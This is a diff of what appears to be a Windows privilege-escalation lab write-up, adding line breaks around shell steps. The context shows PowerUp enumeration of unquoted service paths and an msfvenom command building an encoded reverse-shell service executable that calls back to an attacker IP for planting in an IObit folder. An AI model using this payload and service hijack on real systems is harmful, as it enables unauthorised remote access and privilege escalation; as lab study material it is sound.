@@ -297,7 +297,7 @@ d----         7/10/2026   9:55 PM            %TEMP%
 -a---         7/10/2026   9:46 PM     600580 PowerUp.ps1
 ```
 
-PS > . .\PowerUp.ps1
+PS > . .\PowerUp.ps1 <br>
 PS > Invoke-Allchecks
 
 ```
@@ -341,7 +341,7 @@ Check          : Unquoted Service Paths
 
 ```
 
-┌──(kali㉿kali)-[~]
+┌──(kali㉿kali)-[~] <br>
 └─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.175.163 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
 
 ```
@@ -356,7 +356,7 @@ Final size of exe-service file: 15872 bytes
 Saved as: Advanced.exe
 ```
 
-PS > cd C:\
+PS > cd C:\ <br>
 PS > dir
 
 ```
@@ -375,7 +375,7 @@ d----        10/12/2020  12:09 PM            Windows
 -a---        10/12/2020  12:06 PM      13182 install.ps1
 ```
 
-PS > cd "Program Files (x86)"
+PS > cd "Program Files (x86)" <br>
 PS > dir
 
 ```
@@ -393,7 +393,7 @@ d----         8/22/2013   8:39 AM            Windows NT
 d----         8/22/2013   8:39 AM            WindowsPowerShell
 
 ```
-PS > cd IObit
+PS > cd IObit <br>
 PS > dir
 
 ```
